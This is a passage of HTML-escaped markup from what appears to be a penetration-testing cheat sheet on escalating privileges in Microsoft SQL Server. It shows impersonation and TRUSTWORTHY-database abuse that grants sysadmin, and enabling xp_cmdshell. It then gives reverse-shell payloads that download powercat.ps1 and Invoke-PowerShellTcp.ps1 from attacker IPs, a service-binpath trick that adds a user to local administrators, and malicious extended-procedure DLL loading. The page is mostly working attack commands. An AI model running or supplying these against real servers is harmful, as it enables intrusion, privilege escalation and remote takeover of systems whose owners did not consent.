&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;dbadmin&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ORIGINAL_LOGIN&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="public-to-sysadmin---trustworthy-database">Public to Sysadmin - Trustworthy database&lt;/h4>
&lt;p>A database property (is_trustworthy_on) used to indicate whether a SQL Server instance trusts a database and its contents. The property is turned off by default as a security measure. Only a sysadmin can set a database to be TRUSTWORTHY. When TRUSTWORTHY is off, impersonated users (by using EXECUTE AS) will only have database-scope permissions but when TRUSTWORTHY is turned on impersonated users can perform actions with server level permissions.&lt;/p>
&lt;p>Look for TRUSTWORTHY database using &lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-GridView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditPrivTrustworthy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Look for &lt;strong>TRUSTWORTHY&lt;/strong> database (can be done with public role):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">database_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SUSER_NAME&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">owner_sid&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">database_owner&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">is_trustworthy_on&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">TRUSTWORTHY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">databases&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Look for &lt;strong>db_owner&lt;/strong> role (can be done with public role) on the found trustworthy database:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseRoleName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">isnull&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;No members&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseUserName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_role_members&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">RIGHT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">role_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">member_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Perform EXECUTE AS in &lt;code>HeidiSQL&lt;/code>to become the db owner (with elevated privileges) and give a Domain User the sysadmin role:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">USER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;dbowner&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">system_user&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_addsrvrolemember&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DOMAIN\USER&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sysadmin-to-os-service-account">Sysadmin to OS Service Account&lt;/h3>
&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-xp_cmdshell">Sysadmin to OS Service Account - Command Execution with xp_cmdshell&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- If xp_cmdshell is uninstalled:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_addextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_cmdshell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;xplog70.dll&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- If xp_cmdshell is disabled:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;show advanced options&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_configure&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_cmdshell&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">RECONFIGURE&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute a payload via HeidiSQL to get a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Query to be executed in HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -c test-netconnection 192.168.50.53 -port 80&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.50.53/powercat.ps1&amp;#39;&amp;#39;); powercat -c 192.168.50.53 -p 4444 -e cmd -v&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -ep bypass -c . \\192.168.50.50\share\PowerUp.ps1; Invoke-AllChecks&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># On the local machine:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">4444&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Once you get a stable shell you can escalate your privileges&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">qc&lt;/span> &lt;span class="n">ALG&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">config&lt;/span> &lt;span class="n">ALG&lt;/span> &lt;span class="n">binpath&lt;/span>&lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;net localgroup administrators CYBERLAB\user01 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">qc&lt;/span> &lt;span class="n">ALG&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc &lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="n">ALG&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="nb">sc start &lt;/span>&lt;span class="n">ALG&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">localgroup&lt;/span> &lt;span class="n">administrators&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>Nishang&lt;/code>:&lt;/p>
&lt;p>Automatically enable xp_cmdshell and open a shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Authenticate through windows authentication (for an alternative user you need to launch a new PowerShell session with different credentials) and open a shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-WindowsAuthentication&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Authenticate and execute a payload:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-WindowsAuthentication&lt;/span> &lt;span class="n">-payload&lt;/span> &lt;span class="s2">&amp;#34;iex ((New-Object Net.Webclient).downloadstring(&amp;#39;&amp;#39;http://192.168.254.1/Invoke-PowerShellTcp.ps1&amp;#39;&amp;#39;));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If no payload is specified it is possible to spawn a shell (powershell, cmd or mssql):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;Password1&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;p>Automatically enable xp_cmdshell and execute the command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmd&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you want to use windows authentication do not user username parameter but launch a Powershell session as the desired user.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="sysadmin-to-os-service-account---command-execution-with-extended-stored-procedures">Sysadmin to OS Service Account - Command Execution with extended stored procedures&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create the DLL with desired commands&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Create-SQLFileXpDll&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;C:\fileserver\xp_calc.dll&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;calc.exe&amp;#34;&lt;/span> &lt;span class="n">-ExportName&lt;/span> &lt;span class="s2">&amp;#34;xp_calc&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add the DLL as a stored procedure&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;sp_addextendedproc &amp;#39;xp_calc&amp;#39;, &amp;#39;\\192.168.15.2\fileserver\xp_calc.dll&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List existing Extended stored procedures&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLStoredProcedureXP&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the stored procedure&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;EXEC xp_calc&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- sp_addextendedproc can be used to register the stored procedure. Note that the function name in the DLL and the command must exactly be the same (case-sensitive)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_addextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_calc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;C:\mydll\xp_calc.dll&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Execute the stored procedure
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">xp_calc&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Drop the stored procedure
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">sp_dropextendedproc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xp_calc&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Code sample for DLL can be found here:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp" target="_blank" rel="noopener">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure" target="_blank" rel="noopener">https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extendedstored-procedure&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
